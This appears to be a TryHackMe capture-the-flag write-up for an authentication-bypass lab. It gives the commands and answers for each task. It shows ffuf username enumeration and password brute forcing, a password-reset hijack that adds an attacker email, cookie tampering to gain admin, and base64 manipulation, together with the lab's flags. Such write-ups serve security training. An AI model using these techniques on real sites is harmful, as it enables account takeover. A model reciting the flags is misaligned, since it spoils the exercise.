# THM - Authentication Bypass

<br>

## Task 2

🧰 https://github.com/ffuf/ffuf

http://10.10.113.185/customers/signup

### Task 2.1

```shell
ffuf -w ../../Tools/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.113.185/customers/signup -mr "username already exists"

echo -e "admin\nrobert\nsimon\nsteve" >> valid_usernames.txt
```

> simon

### Task 2.2

> steve

### Task 2.3

> robert

<br>

## Task 3

http://10.10.113.185/customers/login

### Task 3.1

```shell
ffuf -w valid_usernames.txt:W1,../../Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.113.185/customers/login -fc 200
```

> Steve/thunder

<br>

## Task 4

### Task 4.1

```shell
curl 'http://10.10.113.185/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

curl 'http://10.10.113.185/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

http://10.10.113.185/customers/signup

Username: dftf

```shell
curl 'http://10.10.113.185/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=dftf@customer.acmeitsupport.thm'
```

http://10.10.113.185/customers/tickets/3

http://10.10.113.185/customers/reset/2b569ead859164754e7dbe86dd0ad233

http://10.10.113.185/customers/tickets/1

> THM{AUTH_BYPASS_COMPLETE}


<br>

## Task 5

```shell
curl http://10.10.88.14/cookie-test

curl -H "Cookie: logged_in=true; admin=false" http://10.10.88.14/cookie-test
```

### Task 5.1

```shell
curl -H "Cookie: logged_in=true; admin=true" http://10.10.88.14/cookie-test
```

> THM{COOKIE_TAMPERING}

### Task 5.2

🧰 https://crackstation.net/

> 463729

### Task 5.3

```shell
echo "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d
```

> THM{BASE64_ENCODING}

### Task 5.4

```shell
echo '{"id":1,"admin":true}' | base64
```

> eyJpZCI6MSwiYWRtaW4iOnRydWV9Cg==

